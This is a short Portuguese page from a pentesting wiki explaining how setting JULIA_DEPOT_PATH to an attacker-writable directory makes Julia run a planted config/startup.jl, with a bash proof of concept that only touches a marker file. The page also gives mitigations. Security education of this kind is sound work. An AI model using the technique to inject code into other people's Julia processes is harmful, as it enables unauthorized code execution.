# Injeção em aplicações Julia do macOS

{{#include ../../../banners/hacktricks-training.md}}

## `JULIA_DEPOT_PATH` e `startup.jl`

O Julia normalmente executa `config/startup.jl` a partir do seu primeiro depot na inicialização. `JULIA_DEPOT_PATH` controla a lista de depots; portanto, apontá-la para uma árvore legível pelo atacante redireciona o arquivo de inicialização carregado automaticamente.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```
O separador final é útil quando a vítima ainda precisa dos pacotes normais. `julia --startup-file=no` desativa este arquivo de inicialização. Limpe a variável antes da execução, pois ela também controla os registros de pacotes, ambientes, caches e locais de carregamento de código.

## References

- [1] [Julia command-line interface: Arquivo de inicialização](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [2] [Julia environment variables: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
{{#include ../../../banners/hacktricks-training.md}}
